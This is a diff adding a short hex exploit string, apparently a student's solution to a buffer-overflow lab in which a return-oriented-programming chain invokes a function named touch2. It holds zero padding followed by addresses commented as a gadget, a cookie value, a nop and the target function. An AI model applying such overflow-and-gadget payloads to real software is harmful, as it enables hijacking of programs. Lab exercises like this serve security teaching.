@@ -1,0 +1,9 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+1b 14 40 00 00 00 00 00  /* gadges 1 */
+fa 97 b9 59 00 00 00 00 /* cookies value */
+cd 19 40 00 00 00 00 00  /* nop, need touch2 function to be called in next 16 byte padding position */
+ec 17 40 00 00 00 00 00  /* address of touch2 function */
